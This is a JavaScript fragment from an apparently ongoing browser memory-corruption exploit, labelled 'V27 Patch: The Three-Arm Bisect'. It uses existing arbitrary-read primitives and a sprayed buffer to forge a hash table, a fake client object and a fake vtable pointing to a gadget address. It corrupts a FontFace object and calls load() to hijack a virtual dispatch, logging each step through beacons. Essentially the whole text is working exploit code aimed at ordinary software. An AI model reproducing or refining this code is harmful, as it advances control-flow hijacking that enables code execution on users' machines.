// V27 Patch: The Three-Arm Bisect — machinery / real-dispatch / fake-dispatch
//
// V26 RESULT: timer bytes were CORRECT all along — the hygiene beacon lied:
// Uint8Array.prototype.map returns a TYPED ARRAY, so map(x=>x.toString(16))
// coerces the strings back to numbers ("c0"->NaN->0, "1f"->NaN->0, "8"->8).
// V26 had a fully valid hygiened timer (real vptr, real Thread*, fire=0,
// heapItem=null) and STILL crashed at LOAD-PRE.
//
// EVERY component is now individually verified correct:
//   table (source-verified metadata/buckets, no shrink possible)
//   impl (real L2 byte-copy, m_ptr@+0x08 device-verified)
//   client (real wrapper byte-copy, real promise)
//   timer (hygiened, real vptr+Thread*)
// The ONLY untested variable: the dispatch machinery on OUR table.
//
// THREE ARMS (?a=weaknull|realclient|fake):
//   weaknull:  impl.m_ptr = 0. removeIf REMOVES the null entry (writes the
//             deleted marker + keyCount 1->0 into OUR metadata), iteration
//             finds keyCount=0 -> begin==end -> ZERO dispatches. Tests the
//             FULL machinery (removeIf with real removal + empty iteration
//             + both status transitions + timer stop) with NO dispatch.
//             RETURN => machinery fine, crash is IN the dispatch.
//   realclient: impl.m_ptr = FB (the REAL FontFace wrapper). The dispatch
//             fires through the REAL wrapper's REAL vtable: the REAL
//             fontStateChanged with this=the real wrapper, face=ours.
//             Loading case: break. Failure: the REAL promise (fulfilled ->
//             skip). Tests the ENTIRE dispatch with REAL objects.
//             RETURN => dispatch machinery fine -> the crash is OUR fake
//             client/vtable. CRASH => the machinery itself.
//   fake (default): V26 exactly (fake client + fake vtable + gadget).
//
// All beacons fixed: Array.from() before map (no more typed-array coercion).

/* ==== V27: THE THREE-ARM BISECT ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V27-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      var ARM=(function(){var m=/[?&]a=(weaknull|realclient|fake)/.exec(location.search);return m?m[1]:'fake';})();
      bs('V27-ARM='+ARM);

      /* ---- STEP 1: ALL readAt FIRST ---- */
      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
      bs('V27-PROMISE-ADDR='+hex(promiseAddr));
      var promiseBefore=readAt(promiseAddr,0x30);
      bs('V27-PROMISE-BEFORE='+promiseBefore);

      bs('V27-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V27-NO-SIBLING');verd('err','V27 no sibling');throw 'no sibling';}
      bs('V27-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V27-TIMER-BORROWED='+timerH);

      /* ---- STEP 2: build the forge ---- */
      bs('V27-FORGE-BUILD');

      /* impl = real L2 byte-copy; m_ptr per arm */
      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      if(ARM==='weaknull')    dvSetBig(sv,0x08,0n);        /* null client -> entry gets REMOVED */
      else if(ARM==='realclient')dvSetBig(sv,0x08,FB);      /* the REAL wrapper -> real dispatch */
      else                   dvSetBig(sv,0x08,S+0x50n);    /* our fake client */
      bs('V27-IMPL-m_ptr='+hex(dvGetBig(sv,0x08)));

      put32(sv,0x20,0);   /* deletedCount = 0 */
      put32(sv,0x24,1);   /* keyCount = 1 */
      put32(sv,0x28,3);   /* mask = 3 */
      put32(sv,0x2C,4);   /* size = 4 */

      dvSetBig(sv,0x30,S);
      dvSetBig(sv,0x38,0n);
      dvSetBig(sv,0x40,0n);
      dvSetBig(sv,0x48,0n);

      /* client = real wrapper byte-copy (only used by the fake arm) */
      for(var cb=0;cb<0x40;cb++)sv.setUint8(0x50+cb,parseInt(fbRaw.substr(cb*2,2),16));
      dvSetBig(sv,0x50+0x00,S+0x90n);
      var clientPromise=dvGetBig(sv,0x50+0x18);
      bs('V27-CLIENT-PROMISE='+hex(clientPromise)+(clientPromise===promiseAddr?'-IS-REAL-OK':'-MISMATCH'));

      /* vtable: slot3 = FSG (the fake arm uses it; others never reach it) */
      for(var vs=0;vs<8;vs++)dvSetBig(sv,0x90+vs*8,NOPG);
      dvSetBig(sv,0x90+0x18,FSG);

      bs('V27-FORGE-BUILT-T='+(S+0x30n).toString(16)+'-client='+(S+0x50n).toString(16)+'-vt='+(S+0x90n).toString(16));
      bs('V27-VERIFY-vt-slot3='+hex(dvGetBig(sv,0x90+0x18)));

      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ---- STEP 3: craft the FACE ---- */
      bs('V27-FACE-CRAFT');
      for(var sz=0x28;sz<=0x47;sz++)hitBuf[sz]=0;
      hitBuf[0x82]=0;
      hitBuf[0x83]=1;
      hitBuf[0x87]=1;
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;
      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;
      bs('V27-TIMER-HYGIENE-vptr='+Array.from(hitBuf.slice(0x90,0x98)).map(function(x){return x.toString(16);}).join(',')+'-thread='+Array.from(hitBuf.slice(0xB0,0xB8)).map(function(x){return x.toString(16);}).join(','));
      bs('V27-FACE-VERIFY-status='+hitBuf[0x82]+'-override='+hitBuf[0x87]);

      /* ---- STEP 4: install ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);
      bs('V27-INSTALLED-tblPtr='+hex(S+0x30n));

      /* ---- STEP 5: THE DISPATCH ---- */
      bs('V27-LOAD-PRE');
      var loadReturned=false;
      try{
        faces[zi].load();
        loadReturned=true;
        bs('V27-LOAD-RETURNED');
      }catch(e){
        bs('V27-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
      }

      bs('V27-POST-returned='+loadReturned);
      bs('V27-STATUS-AFTER='+hitBuf[0x82]);
      try{bs('V27-JS-STATUS='+faces[zi].status);}catch(e){bs('V27-JS-STATUS-ERR');}

      /* metadata readback: did weaknull's removal rewrite our metadata? */
      var metaAfter=Array.from(hitBuf.slice(0x20,0x30),function(x){return x.toString(16);}).join('');
      bs('V27-TABLE-META-VIA-FORGE='+Array.from(new Uint8Array(window.__v688.spray[mIdx].slice(0x20,0x30)),function(x){return x.toString(16);}).join(''));

      /* promise witness */
      var promiseAfter=readAt(promiseAddr,0x30);
      bs('V27-PROMISE-AFTER='+promiseAfter);
      if(promiseAfter!==promiseBefore){
        bs('WIT-V27-PROMISE-CHANGED-fontStateChanged-EXECUTED');
      }else{
        bs('WIT-V27-PROMISE-UNCHANGED');
      }

      var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
      var diffs=[];
      for(var wq=0;wq<0x100;wq+=8){
        var cur=0n,old=0n;
        for(var wb=0;wb<8;wb++){
          cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
          old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
        }
        if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
      }
      if(diffs.length)bs('WIT-V27-FORGE-WRITE-'+diffs.slice(0,10).join('|'));
      else bs('WIT-V27-FORGE-nowrite');

      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V27-RESTORED');

      if(loadReturned){
        verd('ok','V27 '+ARM+' load() RETURNED');
        bs('V27-DONE-'+ARM+'-RETURNED');
      }else{
        verd('err','V27 '+ARM+' crashed');
        bs('V27-DONE-'+ARM+'-CRASHED');
      }

    }else bs('V27-SKIP-bad-idx');
  }else bs('V27-SKIP-missing-data');
}catch(e27){bs('V27-ERR-'+String(e27&&e27.message?e27.message:'?'));}
/* ==== V27 END ==== */
